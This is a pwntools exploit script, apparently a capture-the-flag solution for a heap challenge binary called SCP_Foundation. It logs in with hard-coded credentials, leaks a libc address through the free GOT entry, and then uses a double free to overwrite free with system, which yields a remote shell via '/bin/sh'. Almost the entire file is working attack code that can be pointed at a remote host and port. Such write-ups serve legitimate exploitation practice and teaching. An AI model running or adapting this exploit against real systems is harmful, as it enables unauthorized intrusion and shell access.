#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './SCP_Foundation'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def add(n_size, name, d_size, desc):
    sla('want to do :','2')
    sla('> SCP name\'s length : ', str(n_size))
    sea('> SCP name : ',name)
    sleep(0.1)
    sla('length : ',str(d_size))
    sea('SCP description : ',desc)
    sleep(0.1)

def dlt(index):
    sla('want to do :','4')
    sla('> SCP project ID : ',str(index))

def show(index):
    sla('want to do :','5')
    sleep(0.1)
    sla('> SCP project ID : ',str(index))
    ru('# SCP\'s name is ')
    return rc(6)

def login():
    sla('> Username:','TaQi')
    sla('> Password:','For_the_glory_of_Brunhild')

login()

add(0x28,'AAAAAAAA',0x58,'aaaaaaaa') #0
add(0x28,'BBBBBBBB',0x58,'bbbbbbbb') #1
add(0x28,'CCCCCCCC',0x58,'cccccccc') #2

# leak libc
dlt(0)
dlt(1)
add(0x18,p64(elf.got['free']),0x18,'dddddddd') #3
free = uu64(show(0))
libc_base = free - libc.sym['free']
info_addr('libc_base',libc_base)
system = libc_base + libc.sym['system']
dlt(3)

# double free
dlt(0)
add(0x28,p64(0xdeadbeef),0x58,p64(elf.got['free']-16-14)) #4
add(0x28,p64(0xdeadbeef),0x58,'eeeeeeee') #5
add(0x28,p64(0xdeadbeef),0x58,'ffffffff') #6

# overwrite free got
# debug()
add(0x28,'/bin/sh\0',0x58,'a'*14+p64(system)) #7

# system('/bin/sh')
dlt(7)

p.interactive()

